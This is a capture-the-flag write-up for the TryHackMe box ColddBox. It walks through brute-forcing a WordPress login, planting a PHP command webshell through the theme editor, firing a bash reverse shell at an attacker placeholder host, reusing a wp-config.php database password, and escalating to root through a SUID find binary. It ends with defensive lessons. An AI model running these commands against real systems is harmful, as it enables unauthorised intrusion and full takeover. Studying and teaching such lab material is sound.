ColddBox is an Easy Linux box from TryHackMe built around an outdated WordPress install. A hidden page leaks the site's usernames, `wpscan` brute-forces one of them into the admin panel, and WordPress's own theme editor turns that admin access into code execution as `www-data`. The step that makes the box is a password-reuse trap: the WordPress login password does *not* work for the system user, but the database password sitting in `wp-config.php` does — and from that shell a SUID `find` is a one-command jump to root.

## Reconnaissance & Enumeration

### Port Scan

A single full-port service scan does the whole job here:

```bash
sudo nmap -p- -sCV -O -Pn -n 10.128.136.239 -oN nmap
```

```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
```

Two services, both telling. HTTP on 80 is a **WordPress 4.1.31** site — a version from 2020, comfortably out of date. SSH is present but moved to the non-standard port **4512**; that OpenSSH 7.2p2 is old enough to be vulnerable to a well-known username-enumeration bug:

```bash
searchsploit OpenSSH 7.2p2
```

```bash
OpenSSH 2.3 < 7.7 - Username Enumeration                    | linux/remote/45233.py
OpenSSH 7.2p2 - Username Enumeration                        | linux/remote/40136.py
```

It's worth noting, but not the intended path — WordPress is going to hand over the usernames far more directly, so SSH stays on the shelf for now.

### Web Enumeration — WordPress on Apache

`whatweb` confirms the stack at a glance: WordPress 4.1.31 on Apache 2.4.18, with `xmlrpc.php` exposed (useful later as a login oracle):

```bash
whatweb http://10.128.136.239/
```

```bash
http://10.128.136.239/ [200 OK] Apache[2.4.18], WordPress[4.1.31],
MetaGenerator[WordPress 4.1.31], x-pingback[/xmlrpc.php], JQuery[1.11.1],
Title[ColddBox | One more machine]
```

A content scan turns up the usual WordPress directories plus one that doesn't belong — `hidden`:

```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.128.136.239 -t 50
```

```bash
wp-content           (Status: 301) [--> http://10.128.136.239/wp-content/]
wp-includes          (Status: 301) [--> http://10.128.136.239/wp-includes/]
wp-admin             (Status: 301) [--> http://10.128.136.239/wp-admin/]

server-status        (Status: 403)
```

`/hidden/` is a note left in-character, and it leaks exactly what a brute-force needs — the site's usernames:

```bash
curl http://10.128.136.239/hidden/
```

```bash
<h1>U-R-G-E-N-T</h1>
<h2>C0ldd, you changed Hugo's password, when you can send it to him
so he can continue uploading his articles. Philip</h2>
```

Three names — **c0ldd**, **hugo**, **philip** — go into a `users.txt`.

### WordPress Credential Attack

With a real user list, `wpscan` can brute-force the login rather than guess blindly. Pointing it at the users and `rockyou.txt` finds one hit almost immediately:

```bash
wpscan --url http://10.128.136.239/ -U users.txt -P /usr/share/wordlists/rockyou.txt
```

```bash
[+] Performing password attack on Wp Login against 3 user/s
[SUCCESS] - c0ldd / 9876543210
```

The obvious first move — reusing `c0ldd:9876543210` over SSH on 4512 — is rejected. It's a WordPress password, not necessarily a system one; that distinction turns out to matter later.

## Initial Access — Theme-Editor RCE as `www-data`

The credentials do log straight into the WordPress admin panel:

![The ColddBox WordPress admin dashboard after logging in as c0ldd](/assets/img/THM/ColddBox/cap1.png)

A WordPress administrator can edit the active theme's PHP from **Appearance → Editor**, and any PHP written there executes on the server. Rather than touch a page that renders on every visit, `404.php` of the active *Twenty Fifteen* theme is a quieter place to drop a one-line command webshell:

![The WordPress theme editor open on 404.php of the Twenty Fifteen theme, ready to insert PHP](/assets/img/THM/ColddBox/cap2.png)

The theme lives at a predictable path, and the edited file executes commands from a `cmd` parameter:

```bash
curl http://10.128.136.239/wp-content/themes/twentyfifteen/404.php?cmd=whoami
```

```bash
www-data
```

To upgrade from a `curl` webshell to an interactive reverse shell, the bash one-liner is URL-encoded first so its metacharacters survive the query string:

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

![The bash reverse-shell one-liner being URL-encoded with an online encoder](/assets/img/THM/ColddBox/cap3.png)

With a listener ready, firing the encoded payload lands the shell:

```bash
curl http://10.128.136.239/wp-content/themes/twentyfifteen/404.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F%3CATTACKER_IP%3E%2F4444%200%3E%261%27
```

```bash
nc -nvlp 4444
```

```bash
Listening on 0.0.0.0 4444
Connection received on 10.128.136.239 48222
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$
```

After the usual TTY upgrade (a real bash via `python3`'s pty, then `stty`), the box is a normal working shell.

## Lateral Movement — `www-data` → `c0ldd`

Only two accounts have real login shells — `root` and `c0ldd`:

```bash
www-data@ColddBox-Easy:/$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
c0ldd:x:1000:1000:c0ldd,,,:/home/c0ldd:/bin/bash
```

The WordPress password is the obvious thing to try, and it fails — a good reminder that a CMS credential and a system credential are not the same thing:

```bash
www-data@ColddBox-Easy:/var/www/html$ su c0ldd
Password:
su: Authentication failure
```

But WordPress keeps its database credentials in cleartext in `wp-config.php`, and that file is right there in the web root:

```bash
www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php
define('DB_NAME', 'colddbox');
define('DB_USER', 'c0ldd');
define('DB_PASSWORD', 'cybersecurity');
define('DB_HOST', 'localhost');
```

The database password `cybersecurity` is a *different* string from the WordPress login password — and this one is reused for the system account:

```bash
www-data@ColddBox-Easy:/var/www/html$ su c0ldd
Password:
c0ldd@ColddBox-Easy:/var/www/html$ cd
c0ldd@ColddBox-Easy:~$ cat user.txt
REDACTED
```

## Privilege Escalation — `c0ldd` → `root`

As `c0ldd`, the fastest thing to check is which binaries carry the SUID bit — they run with their owner's privileges no matter who invokes them:

```bash
c0ldd@ColddBox-Easy:~$ find / -perm -4000 2>/dev/null
/bin/su
/bin/mount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/find
/usr/bin/newgrp
...
```

Almost all of that is Ubuntu's standard SUID set. **`/usr/bin/find`** is not — and a SUID `find` is a textbook GTFOBins escalation, because `find`'s `-exec` can run an arbitrary command while keeping the binary's elevated privileges (`-p` stops the spawned shell from dropping them):

```bash
c0ldd@ColddBox-Easy:~$ find . -exec /bin/sh -p \; -quit
# whoami
root
# cat /root/root.txt
REDACTED
```

## Key Takeaways

- **A CMS credential is not a system credential — but a config file often bridges the gap.** The cracked WordPress password never worked outside WordPress; the win was the *database* password in `wp-config.php`, reused for the OS account. Any file that stores a password in cleartext is a lateral-movement primitive if the human behind it reuses it.
- **"Hidden" is not access control.** The `/hidden/` page was unlinked, not protected — a routine directory brute-force found it, and it handed over the exact usernames that turned a blind login attack into a targeted one.
- **A user list changes the economics of brute-forcing.** `wpscan` against three known names and `rockyou.txt` succeeded in seconds; the same attack against unknown users would have been hopeless. Leaking who the users are is often more damaging than it looks.
- **Admin access to a CMS is usually code execution.** WordPress's theme editor is working as designed — an administrator is trusted to run PHP — which is exactly why protecting the admin login and disabling file editing (`DISALLOW_FILE_EDIT`) matter as much as patching.
- **A SUID bit on a general-purpose tool is game over.** `find` was never meant to run privileged, but with the SUID bit its `-exec` inherits root. Nothing outside the standard set should carry SUID, and `find`, `vim`, `nmap` and friends on that list are immediate red flags.
